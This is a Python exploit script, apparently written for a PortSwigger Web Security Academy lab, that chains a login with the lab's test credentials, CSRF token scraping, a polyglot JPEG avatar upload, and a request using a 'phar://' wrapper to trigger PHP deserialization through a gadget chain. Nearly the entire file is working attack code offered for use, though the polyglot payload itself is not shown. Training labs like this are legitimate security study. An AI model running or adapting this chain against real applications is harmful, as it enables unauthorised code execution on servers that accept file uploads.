import requests
from pathlib import Path
import re

class Exploit:
    def __init__(self, base_url):
        self.baseURL = base_url.rstrip("/")
        self.session = requests.Session()
        self.username = "wiener"
        self.password = "peter"
        self.filename = "./out.jpg"
        self.field_name = "avatar"
        self.trigger = "phar://wiener"  

    def extract_token(self, html):
        # parse hidden csrf/token an toàn hơn, luôn return tuple
        for tag in re.findall(r"<input\b[^>]*>", html, flags=re.I):
            type_m = re.search(r'type=["\']?([^"\'>\s]+)', tag, flags=re.I)
            name_m = re.search(r'name=["\']?([^"\'>\s]+)', tag, flags=re.I)
            value_m = re.search(r'value=["\']?([^"\'>]*)', tag, flags=re.I)

            if not name_m:
                continue

            input_type = type_m.group(1).lower() if type_m else ""
            name = name_m.group(1)
            value = value_m.group(1) if value_m else ""

            if input_type == "hidden" and re.search(r"(csrf|token)", name, flags=re.I):
                return name, value

        return None, None

    def login(self):
        login_url = f"{self.baseURL}/login"

        try:
            r = self.session.get(login_url, timeout=10)
            r.raise_for_status()
        except requests.RequestException as e:
            print(f"[!] GET /login failed: {e}")
            return False

        csrf_name, csrf_value = self.extract_token(r.text)

        data = {
            "username": self.username,
            "password": self.password
        }

        if csrf_name:
            data[csrf_name] = csrf_value
            print(f"[*] Found login token: {csrf_name} = {csrf_value[:8]}...")
        else:
            print("[*] No login token found; trying login without token.")

        try:
            r2 = self.session.post(login_url, data=data, allow_redirects=True, timeout=15)
        except requests.RequestException as e:
            print(f"[!] POST /login failed: {e}")
            return False

        print(f"[*] Login POST HTTP {r2.status_code}")
        print(f"    Cookies after login: {self.session.cookies.get_dict()}")

        # kiểm tra thành công thực tế
        if "Log out" in r2.text or "/logout" in r2.text or "my-account" in r2.url:
            print("[+] Login successful")
            return True

        print("[-] Login may have failed")
        print(r2.text[:300])
        return False

    def upload_polyglot(self):
        file_path = Path(self.filename)
        if not file_path.is_file():
            print(f"[-] File not found: {file_path}")
            return False

        account_url = f"{self.baseURL}/my-account?id={self.username}"
        upload_url = f"{self.baseURL}/my-account/avatar"

        extra_data = {}

        # lấy CSRF upload nếu form có
        try:
            r = self.session.get(account_url, timeout=10)
            csrf_name, csrf_value = self.extract_token(r.text)
            if csrf_name:
                extra_data[csrf_name] = csrf_value
                print(f"[*] Found upload token: {csrf_name} = {csrf_value[:8]}...")
        except requests.RequestException:
            pass

        try:
            with open(file_path, "rb") as f:
                files = {
                    self.field_name: (file_path.name, f, "image/jpeg")
                }

                r = self.session.post(
                    upload_url,
                    data=extra_data,
                    files=files,
                    allow_redirects=True,
                    timeout=15
                )
        except OSError as e:
            print(f"[!] Cannot open file: {e}")
            return False
        except requests.RequestException as e:
            print(f"[!] Upload request failed: {e}")
            return False

        print(f"[*] Upload HTTP {r.status_code}")

        if r.status_code in (200, 302):
            print("[+] Upload successful")
            return True

        print("[-] Upload failed")
        print(r.text[:500])
        return False

    def trigger_shell(self):
        trigger_url = f"{self.baseURL}/cgi-bin/avatar.php"

        try:
            r = self.session.get(
                trigger_url,
                params={"avatar": self.trigger},
                timeout=10
            )
        except requests.RequestException as e:
            print(f"[!] Trigger request failed: {e}")
            return False

        print(f"[*] Trigger HTTP {r.status_code}")
        print(r.text[:500])

        # một số lab có thể phản hồi 500 sau khi gadget chain chạy
        if r.status_code in (200, 404, 500):
            print("[+] Trigger sent")
            return True

        print("[-] Trigger failed")
        return False


if __name__ == "__main__":
    BASE_URL = "https://0a2f0064036407f7817a2aab00fc0078.web-security-academy.net"

    exploit = Exploit(BASE_URL)

    if exploit.login() and exploit.upload_polyglot():
        exploit.trigger_shell()
    else:
        print("[-] Exploit chain stopped.")
